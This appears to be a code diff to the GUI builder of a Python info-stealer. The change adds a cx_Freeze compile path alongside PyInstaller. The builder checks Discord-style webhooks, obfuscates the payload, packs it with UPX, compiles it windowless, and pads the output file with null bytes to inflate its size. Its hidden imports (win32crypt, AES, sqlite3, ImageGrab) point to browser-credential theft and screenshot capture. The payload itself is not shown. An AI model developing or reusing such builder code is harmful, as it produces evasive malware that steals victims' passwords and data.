@@ -4,6 +4,7 @@ import random
 import re
 import shutil
 import string
+import subprocess
 import threading
 import time
 from tkinter import filedialog
@@ -193,7 +194,7 @@ class App(customtkinter.CTk):
         self.pump_size.set("10mb")
         self.pump_size.configure(state="disabled")
 
-        self.fileopts = customtkinter.CTkOptionMenu(self.builder_frame, values=[".exe", ".py"],
+        self.fileopts = customtkinter.CTkOptionMenu(self.builder_frame, values=["pyinstaller", "cxfreeze", ".py"],
                                                     font=customtkinter.CTkFont(size=32, family=self.font), width=250, height=45,
                                                     fg_color="#5d11c3", button_hover_color="#5057eb", button_color="#480c96", command=lambda x: self.check_icon())
         self.fileopts.grid(row=1, column=0, sticky="nw", padx=85, pady=340)
@@ -353,8 +354,10 @@ class App(customtkinter.CTk):
 
     def get_filetype(self):
         file_type = self.fileopts.get()
-        if file_type in [".exe", ".py"]:
+        if file_type == ".py":
             return file_type.replace(".", "")
+        else:
+            return file_type
 
     def reset_check_webhook_button(self):
         self.checkwebhook_button.configure(fg_color="#5d11c3", hover_color="#5057eb", text="Check Webhook")
@@ -405,16 +408,44 @@ class App(customtkinter.CTk):
             for _ in range(int(pump_size)):
                 f.write((b'\x00'))
 
-    def compile_file(self, filename):
-        os.system("python ./tools/upx.py")
-
+    def compile_file(self, filename, filetype):
         if self.iconpath is None:
             exeicon = "NONE"
         else:
             exeicon = self.iconpath
 
-        os.system(
-            f'''python -m PyInstaller --onefile --clean --noconsole --upx-dir=./tools --distpath ./ --hidden-import base64 --hidden-import ctypes --hidden-import json --hidden-import re --hidden-import time --hidden-import subprocess --hidden-import sys --hidden-import sqlite3 --hidden-import requests_toolbelt --hidden-import psutil --hidden-import PIL --hidden-import PIL.ImageGrab --hidden-import Crypto --hidden-import Crypto.Cipher.AES --hidden-import win32crypt --icon {exeicon} .\\{filename}.py''')
+        if filetype == "pyinstaller":
+            subprocess.run(["python", "./tools/upx.py"])
+            subprocess.run(["python", "-m", "PyInstaller",
+                            "--onefile", "--clean", "--noconsole",
+                            "--upx-dir=./tools", "--distpath=./",
+                            "--hidden-import", "base64",
+                            "--hidden-import", "ctypes",
+                            "--hidden-import", "json",
+                            "--hidden-import", "re",
+                            "--hidden-import", "time",
+                            "--hidden-import", "subprocess",
+                            "--hidden-import", "sys",
+                            "--hidden-import", "sqlite3",
+                            "--hidden-import", "requests_toolbelt",
+                            "--hidden-import", "psutil",
+                            "--hidden-import", "PIL",
+                            "--hidden-import", "PIL.ImageGrab",
+                            "--hidden-import", "Crypto",
+                            "--hidden-import", "Crypto.Cipher.AES",
+                            "--hidden-import", "win32crypt",
+                            "--icon", exeicon, f"./{filename}.py"])
+
+        elif filetype == "cxfreeze":
+            cmd_args = [
+                "cxfreeze",
+                f"{filename}.py",
+                "--target-name", filename,
+                "--base-name", "Win32GUI",
+            ]
+            if exeicon != "NONE":
+                cmd_args += ["--icon", exeicon]
+            subprocess.run(cmd_args)
 
     def cleanup_files(self, filename):
         cleans_dir = {'./__pycache__', './build'}
@@ -456,10 +487,10 @@ class App(customtkinter.CTk):
             self.built_file()
             self.builder_frame.after(3000, self.reset_build_button)
 
-        elif self.get_filetype() == "exe":
+        elif self.get_filetype() == "pyinstaller":
             self.write_and_obfuscate(filename)
 
-            thread = threading.Thread(target=self.compile_file, args=(filename,))
+            thread = threading.Thread(target=self.compile_file, args=(filename, "pyinstaller",))
             thread.start()
             self.building_button_thread(thread)
 
@@ -469,6 +500,19 @@ class App(customtkinter.CTk):
             self.built_file()
             self.builder_frame.after(3000, self.reset_build_button)
             self.cleanup_files(filename)
+
+        elif self.get_filetype() == "cxfreeze":
+            self.write_and_obfuscate(filename)
+
+            thread = threading.Thread(target=self.compile_file, args=(filename, "cxfreeze",))
+            thread.start()
+            self.building_button_thread(thread)
+
+            if self.pump.get() == 1:
+                self.file_pumper(filename, "exe", self.get_mb())
+
+            self.built_file()
+            self.builder_frame.after(3000, self.reset_build_button)
 
 
 if __name__ == "__main__":
